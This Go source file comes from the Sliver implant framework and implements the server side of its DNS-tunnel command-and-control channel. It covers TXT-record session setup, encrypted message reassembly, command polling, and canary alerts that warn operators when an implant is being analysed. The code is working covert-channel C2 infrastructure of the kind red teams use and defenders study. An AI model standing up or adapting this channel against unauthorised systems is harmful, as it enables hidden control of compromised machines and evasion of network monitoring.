package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	---
	DNS Tunnel Implementation
*/

import (
	"crypto/sha256"
	"crypto/x509"
	"math"
	"net"
	"sort"

	"github.com/bishopfox/sliver/server/generate"

	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/pem"

	secureRand "crypto/rand"
	"errors"
	"fmt"
	insecureRand "math/rand"
	"strconv"
	"strings"
	"sync"
	"time"

	consts "github.com/bishopfox/sliver/client/constants"
	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	serverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"

	"github.com/golang/protobuf/proto"
	"github.com/miekg/dns"
)

const (
	sessionIDSize = 12

	domainKeyMsg  = "_domainkey"
	blockReqMsg   = "b"
	clearBlockMsg = "cb"

	sessionInitMsg     = "si"
	sessionPollingMsg  = "sp"
	sessionEnvelopeMsg = "se"

	// Max TXT record is 255, records are b64 so (n*8 + 5) / 6 = ~250
	byteBlockSize = 185 // Can be as high as n = 187, but we'll leave some slop
	blockIDSize   = 6
)

var (
	dnsLog = log.NamedLogger("c2", "dns")

	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")

	sendBlocksMutex = &sync.RWMutex{}
	sendBlocks      = &map[string]*SendBlock{}

	dnsSessionsMutex = &sync.RWMutex{}
	dnsSessions      = &map[string]*DNSSession{}

	blockReassemblerMutex = &sync.RWMutex{}
	blockReassembler      = &map[string][][]byte{}

	dnsSegmentReassemblerMutex = &sync.RWMutex{}
	dnsSegmentReassembler      = &map[string](*map[int][]string){}
)

// SendBlock - Data is encoded and split into `Blocks`
type SendBlock struct {
	ID   string
	Data []string
}

// DNSSession - Holds DNS session information
type DNSSession struct {
	ID          string
	Sliver      *core.Sliver
	Key         cryptography.AESKey
	LastCheckin time.Time
	replay      map[string]bool // Sessions are mutex'd
}

func (s *DNSSession) isReplayAttack(ciphertext []byte) bool {
	if len(ciphertext) < 1 {
		return false
	}
	sha := sha256.New()
	sha.Write(ciphertext)
	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
	if _, ok := s.replay[digest]; ok {
		return true
	}
	s.replay[digest] = true
	return false
}

// --------------------------- DNS SERVER ---------------------------

// StartDNSListener - Start a DNS listener
func StartDNSListener(domains []string, canaries bool) *dns.Server {

	dnsLog.Infof("Starting DNS listener for %v (canaries: %v) ...", domains, canaries)

	dns.HandleFunc(".", func(writer dns.ResponseWriter, req *dns.Msg) {
		req.Question[0].Name = strings.ToLower(req.Question[0].Name)
		handleDNSRequest(domains, canaries, writer, req)
	})

	server := &dns.Server{Addr: ":53", Net: "udp"}
	return server
}

// DNSRequest -> C2 or canary?
func handleDNSRequest(domains []string, canaries bool, writer dns.ResponseWriter, req *dns.Msg) {
	if req == nil {
		dnsLog.Info("req can not be nil")
		return
	}

	if len(req.Question) < 1 {
		dnsLog.Info("No questions in DNS request")
		return
	}

	var resp *dns.Msg
	isC2, domain := isC2SubDomain(domains, req.Question[0].Name)
	if isC2 {
		dnsLog.Debugf("'%s' is subdomain of c2 parent '%s'", req.Question[0].Name, domain)
		resp = handleC2(domain, req)
	} else if canaries {
		dnsLog.Debugf("checking '%s' for DNS canary matches", req.Question[0].Name)
		resp = handleCanary(req)
	}

	if resp != nil {
		// dnsLog.Debug(resp.String())
		writer.WriteMsg(resp)
	} else {
		dnsLog.Infof("Invalid query, no DNS response")
	}
}

// Returns true if the requested domain is a c2 subdomain, and the domain it matched with
func isC2SubDomain(domains []string, reqDomain string) (bool, string) {
	for _, parentDomain := range domains {
		if dns.IsSubDomain(parentDomain, reqDomain) {
			dnsLog.Infof("'%s' is subdomain of '%s'", reqDomain, parentDomain)
			return true, parentDomain
		}
	}
	dnsLog.Infof("'%s' is NOT subdomain of any %v", reqDomain, domains)
	return false, ""
}

// C2 -> Record type?
func handleC2(domain string, req *dns.Msg) *dns.Msg {
	subdomain := req.Question[0].Name[:len(req.Question[0].Name)-len(domain)]
	if strings.HasSuffix(subdomain, ".") {
		subdomain = subdomain[:len(subdomain)-1]
	}
	dnsLog.Infof("processing req for subdomain = %s", subdomain)
	switch req.Question[0].Qtype {
	case dns.TypeTXT:
		return handleTXT(domain, subdomain, req)
	default:
	}
	return nil
}

// Canary -> valid? -> trigger alert event
func handleCanary(req *dns.Msg) *dns.Msg {

	reqDomain := strings.ToLower(req.Question[0].Name)
	if !strings.HasSuffix(reqDomain, ".") {
		reqDomain += "." // Ensure we have the FQDN
	}

	canary, err := generate.CheckCanary(reqDomain)
	if err != nil {
		return nil
	}

	resp := new(dns.Msg)
	resp.SetReply(req)
	if canary != nil {
		dnsLog.Warnf("DNS canary tripped for '%s'", canary.SliverName)
		if !canary.Triggered {
			// Defer publishing the event until we're sure the db is sync'd
			defer core.EventBroker.Publish(core.Event{
				Sliver: &core.Sliver{
					Name: canary.SliverName,
				},
				Data:      []byte(canary.Domain),
				EventType: consts.CanaryEvent,
			})
			canary.Triggered = true
			canary.FirstTrigger = time.Now().Format(time.RFC1123)
		}
		canary.LatestTrigger = time.Now().Format(time.RFC1123)
		canary.Count++
		generate.UpdateCanary(canary)
	}

	// Respond with random IPs
	switch req.Question[0].Qtype {
	case dns.TypeA:
		resp.Answer = append(resp.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: req.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
			A:   randomIP(),
		})
	default:
	}

	return resp
}

// handles the c2 TXT record interactions, kind hacky this probably needs to get refactored at some point
func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {

	q := req.Question[0]
	fields := strings.Split(subdomain, ".")

	resp := new(dns.Msg)
	resp.SetReply(req)
	msgType := strings.ToLower(fields[len(fields)-1])

	switch msgType {

	case domainKeyMsg: // Send PubKey -  _(nonce).(slivername).domainkey.example.com
		result, err := getDomainKeyFor(domain)
		if err != nil {
			dnsLog.Infof("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case blockReqMsg: // Get block: _(nonce).(start).(stop).(block id).b.example.com
		if len(fields) == 5 {
			startIndex := fields[1]
			stopIndex := fields[2]
			blockID := fields[3]
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
				Txt: dnsSendBlocks(blockID, startIndex, stopIndex),
			}
			resp.Answer = append(resp.Answer, txt)
		} else {
			dnsLog.Infof("Block request has invalid number of fields %d expected %d", len(fields), 5)
		}

	case clearBlockMsg: // Clear block: _(nonce).(block id)._cb.example.com
		if len(fields) == 3 {
			result := 0
			if clearSendBlock(fields[1]) {
				result = 1
			}
			txt := &dns.TXT{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
				Txt: []string{fmt.Sprintf("%d", result)},
			}
			resp.Answer = append(resp.Answer, txt)
		}

	case "_" + sessionInitMsg:
		fallthrough
	case sessionInitMsg: // Session init: (data)...(seq).(nonce).(_)si.example.com
		result, err := startDNSSession(domain, fields)
		if err != nil {
			dnsLog.Infof("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case "_" + sessionEnvelopeMsg:
		fallthrough
	case sessionEnvelopeMsg:
		result, err := dnsSessionEnvelope(domain, fields)
		if err != nil {
			dnsLog.Infof("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	case sessionPollingMsg:
		result, err := dnsSessionPoll(domain, fields)
		if err != nil {
			dnsLog.Infof("Error during session init: %v", err)
		}
		txt := &dns.TXT{
			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
			Txt: result,
		}
		resp.Answer = append(resp.Answer, txt)

	default:
		dnsLog.Infof("Unknown msg type '%s' in TXT req", fields[len(fields)-1])
	}

	return resp
}

// --------------------------- FIELDS ---------------------------

func getFieldMsgType(fields []string) (string, error) {
	if len(fields) < 1 {
		return "", errors.New("Invalid number of fields in session init message (nounce)")
	}
	return fields[len(fields)-1], nil
}

func getFieldSessionID(fields []string) (string, error) {
	if len(fields) < 2 {
		return "", errors.New("Invalid number of fields in session init message (session id)")
	}
	sessionID := fields[len(fields)-2]
	if sessionID == "_" {
		return "", errors.New("Session ID is null")
	}
	return sessionID, nil
}

func getFieldNonce(fields []string) (string, error) {
	if len(fields) < 3 {
		return "", errors.New("Invalid number of fields in session init message (nounce)")
	}
	return fields[len(fields)-3], nil
}

func getFieldSeq(fields []string) (int, error) {
	if len(fields) < 4 {
		return -1, errors.New("Invalid number of fields in session init message (seq)")
	}
	rawSeq := fields[len(fields)-4]
	data, err := dnsDecodeString(rawSeq)
	if err != nil {
		dnsLog.Infof("Failed to decode seq field: %#v", rawSeq)
		return 0, err
	}
	index := int(binary.LittleEndian.Uint32(data))

	return index, nil
}

func getFieldSubdata(fields []string) ([]string, error) {
	if len(fields) < 5 {
		return []string{}, errors.New("Invalid number of fields in session init message (subdata)")
	}
	subdataFields := len(fields) - 4
	dnsLog.Infof("Domain contains %d subdata fields", subdataFields)
	return fields[:subdataFields], nil
}

// --------------------------- DNS SESSION START ---------------------------

// Returns an confirmation value (e.g. exit code 0 non-0) and error
func startDNSSession(domain string, fields []string) ([]string, error) {
	dnsLog.Infof("[start session] fields = %#v", fields)

	msgType, err := getFieldMsgType(fields)
	if err != nil {
		return []string{"1"}, err
	}

	nonce, err := getFieldNonce(fields)
	if err != nil {
		return []string{"1"}, err
	}

	if !strings.HasPrefix(msgType, "_") {
		return dnsSegment(fields)
	}
	dnsLog.Infof("Complete session init message received, reassembling ...")

	// TODO: We don't have replay protection against the RSA-encrypt
	// sessionInit messages, but I don't think it's an issue ...
	encryptedSessionInit, err := dnsSegmentReassemble(nonce)
	if err != nil {
		return []string{"1"}, err
	}

	publicKeyPEM, privateKeyPEM, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, domain)
	if err != nil {
		dnsLog.Infof("Failed to fetch RSA private key")
		return []string{"1"}, err
	}
	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
	dnsLog.Infof("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
	privateKeyBlock, _ := pem.Decode([]byte(privateKeyPEM))
	privateKey, err := x509.ParsePKCS1PrivateKey(privateKeyBlock.Bytes)
	if err != nil {
		dnsLog.Infof("Failed to decode RSA private key")
		return []string{"1"}, err
	}

	dnsLog.Debugf("Session Init: %v", encryptedSessionInit)
	sessionInitData, err := cryptography.RSADecrypt(encryptedSessionInit, privateKey)
	if err != nil {
		dnsLog.Infof("Failed to decrypt session init msg")
		return []string{"1"}, err
	}

	sessionInit := &pb.DNSSessionInit{}
	proto.Unmarshal(sessionInitData, sessionInit)

	dnsLog.Infof("Received new session in request")

	checkin := time.Now()
	sliver := &core.Sliver{
		ID:            core.GetHiveID(),
		Transport:     "dns",
		RemoteAddress: "n/a",
		Send:          make(chan *pb.Envelope, 16),
		RespMutex:     &sync.RWMutex{},
		Resp:          map[uint64]chan *pb.Envelope{},
		LastCheckin:   &checkin,
	}

	core.Hive.AddSliver(sliver)

	aesKey, _ := cryptography.AESKeyFromBytes(sessionInit.Key)
	sessionID := dnsSessionID()
	dnsLog.Infof("Starting new DNS session with id = %s", sessionID)
	dnsSessionsMutex.Lock()
	(*dnsSessions)[sessionID] = &DNSSession{
		ID:          sessionID,
		Sliver:      sliver,
		Key:         aesKey,
		LastCheckin: time.Now(),
		replay:      map[string]bool{},
	}
	dnsSessionsMutex.Unlock()

	encryptedSessionID, _ := cryptography.GCMEncrypt(aesKey, []byte(sessionID))
	result, err := dnsSendOnce(encryptedSessionID)
	if err != nil {
		dnsLog.Infof("Failed to encode message into single result %v", err)
		return []string{"1"}, err
	}

	return result, nil
}

// --------------------------- DNS SESSION RECV ---------------------------

func dnsSessionEnvelope(domain string, fields []string) ([]string, error) {
	dnsLog.Infof("[session envelope] fields = %#v", fields)

	msgType, err := getFieldMsgType(fields)
	if err != nil {
		return []string{"1"}, err
	}

	nonce, err := getFieldNonce(fields)
	if err != nil {
		return []string{"1"}, err
	}

	if !strings.HasPrefix(msgType, "_") {
		return dnsSegment(fields)
	}
	dnsLog.Infof("Complete envelope received, reassembling ...")
	encryptedDNSEnvelope, err := dnsSegmentReassemble(nonce)
	if err != nil {
		return []string{"1"}, errors.New("Failed to reassemble segments")
	}

	sessionID, err := getFieldSessionID(fields)
	if err != nil {
		return []string{"1"}, err
	}
	dnsSessionsMutex.Lock()
	defer dnsSessionsMutex.Unlock()

	if dnsSession, ok := (*dnsSessions)[sessionID]; ok {
		dnsLog.Infof("Envelope has valid DNS session (%s)", dnsSession.ID)
		if dnsSession.isReplayAttack(encryptedDNSEnvelope) {
			dnsLog.Infof("WARNING: Replay attack detected, ignore request")
			return []string{"1"}, errors.New("Replay attack")
		}
		envelopeData, err := cryptography.GCMDecrypt(dnsSession.Key, encryptedDNSEnvelope)
		if err != nil {
			return []string{"1"}, errors.New("Failed to decrypt DNS envelope")
		}
		envelope := &pb.Envelope{}
		proto.Unmarshal(envelopeData, envelope)

		dnsLog.Infof("Envelope Type = %#v RespID = %#v", envelope.Type, envelope.ID)

		checkin := time.Now()
		dnsSession.Sliver.LastCheckin = &checkin

		// Response Envelope or Handler
		handlers := serverHandlers.GetSliverHandlers()
		if envelope.ID != 0 {
			dnsSession.Sliver.RespMutex.Lock()
			defer dnsSession.Sliver.RespMutex.Unlock()
			if resp, ok := dnsSession.Sliver.Resp[envelope.ID]; ok {
				resp <- envelope
			}
		} else if handler, ok := handlers[envelope.Type]; ok {
			handler.(func(*core.Sliver, []byte))(dnsSession.Sliver, envelope.Data)
		}
		return []string{"0"}, nil
	}
	dnsLog.Infof("Invalid session id '%#v'", sessionID)
	return []string{"1"}, errors.New("Invalid session ID")
}

// Client should have sent all of the data, attempt to reassemble segments
func dnsSegmentReassemble(nonce string) ([]byte, error) {
	dnsSegmentReassemblerMutex.Lock()
	defer dnsSegmentReassemblerMutex.Unlock()
	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
		var keys []int
		for k := range *reasm {
			keys = append(keys, k)
		}
		sort.Ints(keys)
		orderedSubdata := []string{}
		for _, k := range keys {
			orderedSubdata = append(orderedSubdata, (*reasm)[k]...)
		}
		data, err := dnsDecodeString(strings.Join(orderedSubdata, ""))
		if err != nil {
			dnsLog.Infof("Failed to decode session init: %v", err)
			return nil, err
		}
		delete((*dnsSegmentReassembler), nonce)
		return data, nil
	}
	return nil, fmt.Errorf("Invalid nonce '%#v' (session init reassembler)", nonce)
}

// The domain is only a segment of the startDNSSession message, so we just store the data
func dnsSegment(fields []string) ([]string, error) {
	dnsSegmentReassemblerMutex.Lock()
	defer dnsSegmentReassemblerMutex.Unlock()

	nonce, _ := getFieldNonce(fields)
	index, err := getFieldSeq(fields)
	if err != nil {
		return []string{"1"}, err
	}
	subdata, err := getFieldSubdata(fields)
	if err != nil {
		return []string{"1"}, err
	}
	if _, ok := (*dnsSegmentReassembler)[nonce]; !ok {
		(*dnsSegmentReassembler)[nonce] = &map[int][]string{}
	}
	if reasm, ok := (*dnsSegmentReassembler)[nonce]; ok {
		(*reasm)[index] = subdata
		return []string{"0"}, nil
	}
	dnsLog.Infof("Invalid nonce (session segment): %#v", nonce)
	return []string{"1"}, errors.New("Invalid nonce (session segment)")
}

// TODO: Avoid double-fetch
func getDomainKeyFor(domain string) ([]string, error) {
	_, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, domain)
	if err != nil {
		certs.ServerGenerateRSACertificate(domain)
	}
	certPEM, _, err := certs.GetCertificate(certs.ServerCA, certs.RSAKey, domain)
	if err != nil {
		return nil, err
	}
	return dnsSendOnce(certPEM)
}

// --------------------------- DNS SESSION SEND ---------------------------

// Send all response data in a single TXT record, limited to 65535 bytes
func dnsSendOnce(rawData []byte) ([]string, error) {
	if 65535 <= base64.RawStdEncoding.EncodedLen(len(rawData)) {
		return nil, errors.New("Response too large to encode into one TXT record")
	}
	data := base64.RawStdEncoding.EncodeToString(rawData)
	dnsLog.Infof("Encoding single resp: %#v", data)
	txts := []string{}
	size := int(math.Ceil(float64(len(data)) / 255.0))
	for index := 0; index < size; index++ {
		start := index * 255
		stop := start + 255
		if len(data) < stop {
			stop = len(data)
		}
		txts = append(txts, data[start:stop])
	}
	return txts, nil
}

func dnsSessionPoll(domain string, fields []string) ([]string, error) {

	sessionID, err := getFieldSessionID(fields)
	if err != nil {
		return []string{"1"}, errors.New("invalid session id (session poll)")
	}
	dnsSessionsMutex.Lock()
	dnsSession := (*dnsSessions)[sessionID]
	dnsSessionsMutex.Unlock()

	isDrained := false
	envelopes := []*pb.Envelope{}
	for !isDrained {
		select {
		case envelope := <-dnsSession.Sliver.Send:
			dnsLog.Infof("New message from send channel ...")
			envelopes = append(envelopes, envelope)
		default:
			isDrained = true
		}
	}

	if 0 < len(envelopes) {
		dnsLog.Infof("%d new message(s) for session id %#v", len(envelopes), sessionID)
		dnsPoll := &pb.DNSPoll{}
		for _, envelope := range envelopes {
			data, err := proto.Marshal(envelope)
			if err != nil {
				dnsLog.Infof("Failed to encode envelope %v", err)
				continue
			}

			encryptedEnvelopeData, err := cryptography.GCMEncrypt(dnsSession.Key, data)
			if err != nil {
				dnsLog.Infof("Failed to encrypt poll data %v", err)
				return []string{"1"}, errors.New("Failed to encrypt dns poll data")
			}

			blockID, size := storeSendBlocks(encryptedEnvelopeData)
			dnsPoll.Blocks = append(dnsPoll.Blocks, &pb.DNSBlockHeader{
				ID:   blockID,
				Size: uint32(size),
			})
		}
		pollData, err := proto.Marshal(dnsPoll)
		if err != nil {
			dnsLog.Infof("Failed to encode envelope %v", err)
			return []string{"1"}, errors.New("Failed to encode dns poll data")
		}
		encryptedPollData, err := cryptography.GCMEncrypt(dnsSession.Key, pollData)
		if err != nil {
			dnsLog.Infof("Failed to encrypt poll data %v", err)
			return []string{"1"}, errors.New("Failed to encrypt dns poll data")
		}
		return dnsSendOnce(encryptedPollData)
	}
	dnsLog.Infof("No new message for session id %#v", sessionID)
	return []string{"0"}, nil
}

// Send blocks of data via multiple DNS TXT responses
func dnsSendBlocks(blockID string, startIndex string, stopIndex string) []string {
	start, err := strconv.Atoi(startIndex)
	if err != nil {
		return []string{}
	}
	stop, err := strconv.Atoi(stopIndex)
	if err != nil {
		return []string{}
	}

	if stop < start {
		return []string{}
	}

	dnsLog.Infof("Send blocks %d to %d for ID %s", start, stop, blockID)

	sendBlocksMutex.Lock()
	defer sendBlocksMutex.Unlock()
	respBlocks := []string{}
	if block, ok := (*sendBlocks)[blockID]; ok {
		for index := start; index < stop; index++ {
			if index < len(block.Data) {
				respBlocks = append(respBlocks, block.Data[index])
			}
		}
		dnsLog.Infof("Sending %d response block(s)", len(respBlocks))
		return respBlocks
	}
	dnsLog.Infof("Invalid block ID: %#v", blockID)
	return []string{}
}

// Clear send blocks of data from memory
func clearSendBlock(blockID string) bool {
	sendBlocksMutex.Lock()
	defer sendBlocksMutex.Unlock()
	if _, ok := (*sendBlocks)[blockID]; ok {
		delete(*sendBlocks, blockID)
		return true
	}
	return false
}

// Stores encoded blocks fo data into "sendBlocks"
func storeSendBlocks(data []byte) (string, int) {
	blockID := generateBlockID()

	sendBlock := &SendBlock{
		ID:   blockID,
		Data: []string{},
	}
	for index := 0; index < len(data); index += byteBlockSize {
		start := index
		stop := index + byteBlockSize
		if len(data) < stop {
			stop = len(data)
		}
		encoded := base64.RawStdEncoding.EncodeToString(data[start:stop])
		dnsLog.Infof("Encoded block is %d bytes", len(encoded))
		sendBlock.Data = append(sendBlock.Data, encoded)
	}
	sendBlocksMutex.Lock()
	(*sendBlocks)[sendBlock.ID] = sendBlock
	sendBlocksMutex.Unlock()
	return sendBlock.ID, len(sendBlock.Data)
}

// --------------------------- HELPERS ---------------------------

// Unique IDs, no need for secure random
func generateBlockID() string {
	insecureRand.Seed(time.Now().UnixNano())
	blockID := []rune{}
	for i := 0; i < blockIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		blockID = append(blockID, dnsCharSet[index])
	}
	return string(blockID)
}

func fingerprintSHA256(block *pem.Block) string {
	hash := sha256.Sum256(block.Bytes)
	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
	return strings.TrimRight(b64hash, "=")
}

// TODO: Add a geofilter to make it look like we're in various regions of the world.
// We don't really need to use srand but it's just easier to operate on bytes here.
func randomIP() net.IP {
	randBuf := make([]byte, 4)
	secureRand.Read(randBuf)

	// Ensure non-zeros with various bitmasks
	return net.IPv4(randBuf[0]|0x10, randBuf[1]|0x10, randBuf[2]|0x1, randBuf[3]|0x10)
}

// --------------------------- ENCODER ---------------------------

var base32Alphabet = "ab1c2d3e4f5g6h7j8k9m0npqrtuvwxyz"
var sliverBase32 = base32.NewEncoding(base32Alphabet)

// EncodeToString encodes the given byte slice in base32
func dnsEncodeToString(input []byte) string {
	return strings.TrimRight(sliverBase32.EncodeToString(input), "=")
}

// DecodeString decodes the given base32 encodeed bytes
func dnsDecodeString(raw string) ([]byte, error) {
	pad := 8 - (len(raw) % 8)
	padded := []byte(raw)
	if pad != 8 {
		padded = make([]byte, len(raw)+pad)
		copy(padded, raw)
		for index := 0; index < pad; index++ {
			padded[len(raw)+index] = '='
		}
	}
	// dnsLog.Infof("[base32] %#v", string(padded))
	return sliverBase32.DecodeString(string(padded))
}

// SessionIDs are public parameters in this use case
// so it's only important that they're unique
func dnsSessionID() string {
	insecureRand.Seed(time.Now().UnixNano())
	sessionID := []rune{}
	for i := 0; i < sessionIDSize; i++ {
		index := insecureRand.Intn(len(dnsCharSet))
		sessionID = append(sessionID, dnsCharSet[index])
	}
	return "_" + string(sessionID)
}
